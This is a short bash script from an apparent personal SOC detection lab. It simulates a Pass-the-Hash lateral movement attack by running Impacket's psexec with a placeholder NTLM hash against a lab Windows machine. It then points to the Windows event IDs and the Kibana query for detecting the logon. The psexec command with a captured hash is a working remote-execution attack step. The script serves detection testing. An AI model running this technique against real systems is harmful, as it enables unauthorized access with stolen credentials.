#!/bin/bash
# =============================================================================
# Script      : pth-psexec.sh
# Author      : KuRo (KuRo0x)
# Lab         : KuRo SOC Detection Lab
# Incident    : INC-008 — Pass-the-Hash (Lateral Movement)
# Attacker VM : kali (172.16.0.11)
# Target VM   : DESKTOP-DPU3CDQ (172.16.0.10) — SMB TCP 445
# Purpose     : Simulate Pass-the-Hash lateral movement using Impacket
#               psexec.py with a captured NTLM hash to authenticate
#               without the plaintext password.
#               Generates Event ID 4624 (Logon Type 3 — Network) and
#               Event ID 4688 (Process Creation) in Windows Security logs
#               shipped by Winlogbeat 8.19.15 to Elasticsearch (winlogbeat-* index)
# Detection   : Elastic Security rule — Pass-the-Hash / Lateral Movement
# MITRE ATT&CK: T1550.002 — Pass-the-Hash | TA0008 Lateral Movement
# NOTE        : Replace NTLM_HASH below with the actual captured hash
#               from INC-007 (Credential Dumping with Mimikatz)
# WARNING     : Run ONLY inside the isolated VMnet3 lab network (172.16.0.0/24)
# =============================================================================

TARGET="172.16.0.10"
DOMAIN="."
USER="administrator"
NTLM_HASH="REPLACE_WITH_CAPTURED_HASH_FROM_INC007"

echo "[*] Starting Pass-the-Hash attack against $TARGET"
echo "[*] User   : $DOMAIN\\$USER"
echo "[*] Hash   : $NTLM_HASH"
echo "[*] Tool   : Impacket psexec.py"
echo "[*] Expected logs: Windows Event ID 4624 Logon Type 3 on DESKTOP-DPU3CDQ"
echo "[*] Expected index: winlogbeat-* in Kibana"
echo ""

impacket-psexec "$DOMAIN/$USER@$TARGET" \
                -hashes ":$NTLM_HASH"

echo ""
echo "[*] Attack complete. Check Kibana Discover:"
echo "    Index: winlogbeat-*"
echo "    KQL  : event.code: \"4624\" and winlog.event_data.LogonType: \"3\" and source.ip: \"172.16.0.11\""
echo "    Rule : Pass-the-Hash / Lateral Movement detection"
